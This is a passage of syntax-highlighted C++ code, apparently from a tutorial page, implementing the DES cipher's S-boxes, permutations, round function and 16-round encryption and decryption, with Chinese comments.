{</span><br><span class="line">		AfterP[i] = BeforeP[Permutation_P[i]<span class="number">-1</span>];</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//32位的异或运算（模2加法）</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">XOR_32</span><span class="params">(<span class="type">int</span> Input_1[<span class="number">32</span>],<span class="type">int</span> Input_2[<span class="number">32</span>],<span class="type">int</span> Output[<span class="number">32</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		Output[i] = (Input_1[i]+ Input_2[i]) % <span class="number">2</span>;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//48位的异或运算（模2加法）</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">XOR_48</span><span class="params">(<span class="type">int</span> Input[<span class="number">48</span>], <span class="type">int</span> K_count, <span class="type">int</span> K[<span class="number">16</span>][<span class="number">48</span>], <span class="type">int</span> Output[<span class="number">48</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		Output[i] = (Input[i] + K[K_count][i]) % <span class="number">2</span>;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//代换选择S盒</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">S</span><span class="params">(<span class="type">int</span> Input[<span class="number">48</span>], <span class="type">int</span> Output[<span class="number">32</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">int</span> S[<span class="number">8</span>][<span class="number">4</span>][<span class="number">16</span>] =</span><br><span class="line">	{ </span><br><span class="line">		{{<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>},{<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>},{<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>},{<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>}},</span><br><span class="line">		{{<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>},{<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>},{<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>},{<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>}},</span><br><span class="line">		{{<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>},{<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>},{<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>},{<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>}},</span><br><span class="line">		{{<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>},{<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>},{<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>},{<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>}},</span><br><span class="line">		{{<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>},{<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>},{<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>},{<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>}},</span><br><span class="line">		{{<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>},{<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>},{<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>},{<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>}},</span><br><span class="line">		{{<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>},{<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>},{<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>},{<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>}},</span><br><span class="line">		{{<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>},{<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>},{<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>},{<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>}}</span><br><span class="line">	};</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt; <span class="number">8</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		<span class="type">int</span> j = Input[i * <span class="number">6</span>] * <span class="number">2</span> + Input[i * <span class="number">6</span> + <span class="number">5</span>];</span><br><span class="line">		<span class="type">int</span> k = Input[i * <span class="number">6</span>+<span class="number">1</span>] * <span class="number">8</span> + Input[i * <span class="number">6</span>+<span class="number">2</span>] * <span class="number">4</span> + Input[i * <span class="number">6</span>+<span class="number">3</span>] * <span class="number">2</span> + Input[i * <span class="number">6</span>+<span class="number">4</span>] * <span class="number">1</span>;</span><br><span class="line">		<span class="type">int</span> s = S[i][j][k];</span><br><span class="line"></span><br><span class="line">		<span class="comment">//int s转二进制</span></span><br><span class="line">		<span class="type">int</span>  remainder;<span class="comment">//余数</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> index = <span class="number">0</span>; index &lt; <span class="number">4</span>; index++)</span><br><span class="line">		{</span><br><span class="line">			remainder = s % <span class="number">2</span>;  <span class="comment">//s除以2的余数</span></span><br><span class="line">			s = s / <span class="number">2</span>;  <span class="comment">//s被2整除的商</span></span><br><span class="line">			Output[i * <span class="number">4</span> + <span class="number">3</span> - index] = remainder;  </span><br><span class="line">		}</span><br><span class="line">       <span class="comment">/*int  index = 0;//计数量</span></span><br><span class="line"><span class="comment">		while (s != 0)//为啥这样写的while（）不行</span></span><br><span class="line"><span class="comment">		{</span></span><br><span class="line"><span class="comment">			remainder = s % 2;  //s除以2的余数</span></span><br><span class="line"><span class="comment">			s = s / 2;  //s被2整除的商</span></span><br><span class="line"><span class="comment">			Output[i*4+3-index] = remainder;  </span></span><br><span class="line"><span class="comment">			index++;</span></span><br><span class="line"><span class="comment">		}*/</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">     }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//轮函数（密钥为K[K_count][48]的  一轮   轮函数）</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Wheel_Structure</span><span class="params">(<span class="type">int</span> K_count,<span class="type">int</span> K[<span class="number">16</span>][<span class="number">48</span>],   <span class="type">int</span> Left_Input[<span class="number">32</span>],<span class="type">int</span> Right_Input[<span class="number">32</span>] )</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//先把Right_Input[32]数组赋值给 中间变量数组Flag[32] 待到合适的时机再赋值给Left_Input[32]</span></span><br><span class="line">	<span class="type">int</span> Flag[<span class="number">32</span>] = {<span class="number">0</span>};</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		Flag[i] = Right_Input[i];</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">//cout &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//cout &lt;&lt; "第" &lt;&lt; K_count &lt;&lt;"轮解密"&lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">/*cout &lt;&lt; "Flag[]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 32; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; Flag[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//扩展置换运算E</span></span><br><span class="line">	<span class="type">int</span> Output_E[<span class="number">48</span>];<span class="comment">//扩展置换运算E的输出</span></span><br><span class="line">	<span class="built_in">Extended_Arithmetic_Permutation_E</span>(Right_Input,  Output_E);</span><br><span class="line">	<span class="comment">/*cout &lt;&lt; "E[]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 48; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; Output_E[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//扩展置换运算E</span></span><br><span class="line">	<span class="type">int</span> Output_XOR_48[<span class="number">48</span>];<span class="comment">//扩展置换运算E的输出</span></span><br><span class="line">	<span class="built_in">XOR_48</span>(Output_E, K_count, K, Output_XOR_48);</span><br><span class="line">	<span class="comment">/*cout &lt;&lt; "XOR_48[]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 48; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; Output_XOR_48[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//代换选择S盒</span></span><br><span class="line">	<span class="type">int</span> Output_S[<span class="number">32</span>];<span class="comment">//代换选择S盒的输出</span></span><br><span class="line">	<span class="built_in">S</span>(Output_XOR_48,  Output_S);</span><br><span class="line">	<span class="comment">/*cout &lt;&lt; "S[]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 32; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; Output_S[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//置换P</span></span><br><span class="line">	<span class="type">int</span> Output_P[<span class="number">32</span>];<span class="comment">//置换P的输出</span></span><br><span class="line">	<span class="built_in">Permutation_P</span>( Output_S, Output_P);</span><br><span class="line">	<span class="comment">/*cout &lt;&lt; "P[]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 32; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; Output_P[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//32位的异或运算</span></span><br><span class="line">	<span class="built_in">XOR_32</span>(Left_Input, Output_P, Right_Input);</span><br><span class="line">	<span class="comment">/*cout &lt;&lt; "NextRight[]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 32; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; Right_Input[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将Flag[32]赋值给Left_Input[32]</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		Left_Input[i] = Flag[i];</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">/*	cout &lt;&lt; "Next_Left[]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 32; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; Flag[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//左右交换     两个32位数组组成  64位数组 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Left_Right_Change_And_Combine</span><span class="params">(<span class="type">int</span> Left_Output[<span class="number">32</span>], <span class="type">int</span> Right_Output[<span class="number">32</span>],<span class="type">int</span> Output[<span class="number">64</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">	{</span><br><span class="line">	 Output[i] = Right_Output[i] ;</span><br><span class="line">	 Output[i + <span class="number">32</span>]=Left_Output[i] ;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//逆初始置换Inverse_IP   </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Inverse_Initial_Permutation_IP</span><span class="params">(<span class="type">int</span> Before[<span class="number">64</span>], <span class="type">int</span> After[<span class="number">64</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">int</span> Inverse_IP[<span class="number">64</span>] = { <span class="number">40</span>,<span class="number">8</span>,<span class="number">48</span>,<span class="number">16</span>,<span class="number">56</span>,<span class="number">24</span>,<span class="number">64</span>,<span class="number">32</span>,     <span class="number">39</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">55</span>,<span class="number">23</span>,<span class="number">63</span>,<span class="number">31</span>,    <span class="number">38</span>,<span class="number">6</span>,<span class="number">46</span>,<span class="number">14</span>,<span class="number">54</span>,<span class="number">22</span>,<span class="number">62</span>,<span class="number">30</span>,    <span class="number">37</span>,<span class="number">5</span>,<span class="number">45</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">21</span>,<span class="number">61</span>,<span class="number">29</span>,    <span class="number">36</span>,<span class="number">4</span>,<span class="number">44</span>,<span class="number">12</span>,<span class="number">52</span>,<span class="number">20</span>,<span class="number">60</span>,<span class="number">28</span>,    <span class="number">35</span>,<span class="number">3</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">51</span>,<span class="number">19</span>,<span class="number">59</span>,<span class="number">27</span>,     <span class="number">34</span>,<span class="number">2</span>,<span class="number">42</span>,<span class="number">10</span>,<span class="number">50</span>,<span class="number">18</span>,<span class="number">58</span>,<span class="number">26</span>,     <span class="number">33</span>,<span class="number">1</span>,<span class="number">41</span>,<span class="number">9</span>,<span class="number">49</span>,<span class="number">17</span>,<span class="number">57</span>,<span class="number">25</span>     };</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		After[i] = Before[Inverse_IP[i] - <span class="number">1</span>];</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//加密</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">E_M_to_C</span><span class="params">(<span class="type">int</span> M[<span class="number">64</span>],<span class="type">int</span> K[<span class="number">16</span>][<span class="number">48</span>],<span class="type">int</span> C[<span class="number">64</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="comment">//初始置换IP</span></span><br><span class="line">	<span class="type">int</span> After_IP[<span class="number">64</span>] = { <span class="number">0</span> };</span><br><span class="line">	<span class="built_in">Initial_Permutation_IP</span>(M, After_IP);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//64位数组   分割成    左右两个32位数组</span></span><br><span class="line">	<span class="type">int</span> Left[<span class="number">32</span>];</span><br><span class="line">	<span class="type">int</span> Right[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">Segmentation_64_32</span>(After_IP,Left ,Right );</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对左右两数组  进行16轮 轮函数加密</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> K_count = <span class="number">0</span>; K_count &lt; <span class="number">16</span>; K_count++)   <span class="comment">//K_count从0到15是加密</span></span><br><span class="line">	{</span><br><span class="line">		<span class="built_in">Wheel_Structure</span>(K_count, K, Left, Right);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="comment">//左右交换    两32位数组  组成  64位数组</span></span><br><span class="line">	<span class="type">int</span> Output_Segmentation[<span class="number">64</span>];</span><br><span class="line">	<span class="built_in">Left_Right_Change_And_Combine</span>(Left, Right, Output_Segmentation);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//逆初始置换Inverse_IP</span></span><br><span class="line">	<span class="built_in">Inverse_Initial_Permutation_IP</span>(Output_Segmentation, C);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">D_C_to_M</span><span class="params">(<span class="type">int</span> C[<span class="number">64</span>], <span class="type">int</span> K[<span class="number">16</span>][<span class="number">48</span>], <span class="type">int</span> M[<span class="number">64</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="comment">//初始置换IP     OK</span></span><br><span class="line">	<span class="type">int</span> After_IP[<span class="number">64</span>] = { <span class="number">0</span> };</span><br><span class="line">	<span class="built_in">Initial_Permutation_IP</span>(C, After_IP);</span><br><span class="line">	<span class="comment">/*cout &lt;&lt; "初始置换后的数组[64]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 64; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; After_IP[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//64位数组   分割成    左右两个32位数组  OK</span></span><br><span class="line">	<span class="type">int</span> Left[<span class="number">32</span>];</span><br><span class="line">	<span class="type">int</span> Right[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">Segmentation_64_32</span>(After_IP, Left, Right);</span><br><span class="line">	<span class="comment">/*	cout &lt;&lt; "Left[]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 32; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; Left[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; "Right[]=";</span></span><br><span class="line"><span class="comment">	for (int i = 0; i &lt; 32; i++)</span></span><br><span class="line"><span class="comment">	{</span></span><br><span class="line"><span class="comment">		cout &lt;&lt; Right[i];</span></span><br><span class="line"><span class="comment">	}</span></span><br><span class="line"><span class="comment">	cout &lt;&lt; endl;*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//对左右两数组  进行16轮 轮函数加密</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> K_count = <span class="number">15</span>; K_count &gt;= <span class="number">0</span>; K_count--)   <span class="comment">//K_count从15到0是解密</span></span><br><span class="line">	{</span><br><span class="line">		<span class="built_in">Wheel_Structure</span>(K_count, K, Left, Right);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="comment">//左右交换    两32位数组  组成  64位数组</span></span><br><span class="line">	<span class="type">int</span> Output_Segmentation[<span class="number">64</span>];</span><br><span class="line">	<span class="built_in">Left_Right_Change_And_Combine</span>(Left, Right, Output_Segmentation);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//逆初始置换Inverse_IP</span></span><br><span class="line">	<span class="built_in">Inverse_Initial_Permutation_IP</span>(Output_Segmentation, M);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************数制转换部分**************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将十六进制转为二进制</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Convertion_16_2</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> k, <span class="type">int</span> Positive_Binary[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">unsigned</span>  remainder;<span class="comment">//余数</span></span><br><span class="line">	<span class="type">unsigned</span>   index = <span class="number">64</span>;<span class="comment">//计数量</span></span><br><span class="line">	<span class="keyword">while</span> (k != <span class="number">0</span>)</span><br><span class="line">	{</span><br><span class="line">		remainder = k % <span class="number">2</span>;  <span class="comment">//m除以2的余数</span></span><br><span class="line">		k = k / <span class="number">2</span>;  <span class="comment">//m被2整除的商</span></span><br><span class="line">		Positive_Binary[index<span class="number">-1</span>] = remainder;  <span 